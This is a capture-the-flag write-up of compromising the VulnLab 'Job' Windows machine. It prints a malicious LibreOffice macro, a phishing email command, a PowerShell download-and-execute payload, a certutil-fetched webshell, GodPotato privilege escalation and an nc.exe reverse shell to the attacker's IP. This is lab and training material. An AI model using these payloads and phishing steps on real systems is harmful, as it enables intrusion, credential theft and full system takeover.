# Job

Hello Friends,

Remo is Back

In this write-up, Iâ€™ll walk through how I pwned theÂ **Job** machine fromÂ **VulnLab**. From initial enumeration to gaining root access, Iâ€™ll explain the key steps, tools, and techniques used to complete the box.

![image.png](../images/job-banner.png)

Letâ€™s start by scanning the machine.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p 25,80,445,3389 --min-rate=1000 10.10.106.238
```

![image.png](../images/job.png)

Now letâ€™s go to the website running on port 80

![image.png](../images/job%201.png)

> Notice that we found a domain name and the CV should be sent as libre office
> 

Now letâ€™s create a Libre Office macro

```bash
libreoffice
```

![image.png](../images/job%202.png)

Now letâ€™s add a macro.

```bash
Sub Main
	Shell("dir \\\\10.8.5.233\\remomacro")
End Sub
```

![image.png](../images/job%203.png)

Now letâ€™s save it and see if itâ€™s saved

![image.png](../images/job%204.png)

Now letâ€™s Open Responder

```bash
sudo responder -I tun0
```

![image.png](../images/job%205.png)

Now letâ€™s send the document

```bash
sendemail -f "remo <remo@job.local>" -a 'remo.odt' -u 'Phishing You!' -m 'open the file so i can hack you!' -s job.local -t 'career@job.local'
```

![image.png](../images/job%206.png)

Now letâ€™s see if we get a hash

![image.png](../images/job%207.png)

As we see we got the hash of the user!

so letâ€™s try to crack it

```bash
john crackme.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image.png](../images/job%208.png)

Unfortunately itâ€™s uncrackable so letâ€™s get a reverse shell 

```bash
REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://10.8.5.233/shell.ps1')""")
End Sub
```

![image.png](../images/job%209.png)

Now letâ€™s open a listener

```bash
nc -lvnp 1337
```

![image.png](../images/job%2010.png)

Now letâ€™s send the macro again

```bash
sendemail -f "remo <remo@job.local>" -a 'remo.odt' -u 'Phishing You!' -m 'open the file so i can hack you!' -s job.local -t 'career@job.local'
```

![image.png](../images/job%2011.png)

Now letâ€™s see if we go a shell

![image.png](../images/job%2012.png)

An we did amazing!

Now letâ€™s see the users privileges

```bash
whoami /all
```

![image.png](../images/job%2013.png)

As we see we are in the developers group so letâ€™s go to the web directory

```bash
cd C:\inetpub\wwwroot
```

![image.png](../images/job%2014.png)

Now letâ€™s upload apsx webshell 

```bash
certutil -urlcache -f http://10.8.5.233/shell.aspx shell.aspx
```

![image.png](../images/job%2015.png)

Now letâ€™s access it from the browser

```bash
http://job.local/shell.aspx
```

![image.png](../images/job%2016.png)

Now letâ€™s go and get a revere shell as the IIS service

First open a listener

```bash
nc -nlvp 1338
```

![image.png](../images/job%2017.png)

Now letâ€™s execute a reverse shell

```bash
powershell -e 
```

![image.png](../images/job%2018.png)

Now letâ€™s go back to our listener

![image.png](../images/job%2019.png)

And we got access as IIS service

Now letâ€™s see the user privileges

```bash
whoami /all
```

![image.png](../images/job%2020.png)

> Notice that we have impersonation privileges
> 

Now letâ€™s go and upload God Potato to help us elevate to system access

```bash
certutil -urlcache -f http://10.8.5.233/gp.exe gp.exe
```

![image.png](../images/job%2021.png)

Now letâ€™s see if we got system access

```bash
.\gp.exe -cmd "cmd /c whoami"
```

![image.png](../images/job%2022.png)

As we see we got system access

so letâ€™s go and get reverse shell as administrator

First open a listener

```bash
nc -lvnp 1339
```

![image.png](../images/job%2023.png)

Now letâ€™s get a reverse shell

```bash
.\gp.exe -cmd "cmd /c C:\windows\temp\nc.exe -nv 10.8.5.233 1339 -e cmd.exe"
```

![image.png](../images/job%2024.png)

Now letâ€™s navigate to the administrator desktop and see the root flag

```bash
cd c:\users\administrator\desktop
```

![image.png](../images/job%2025.png)

Amazing we got the root flag ðŸ¥³

![image.png](../images/job%2026.png)

Thatâ€™s it for theÂ **Job** machine! This challenge was a great test of enumeration and exploitation skills. Hope you found the write-up useful.

Remo
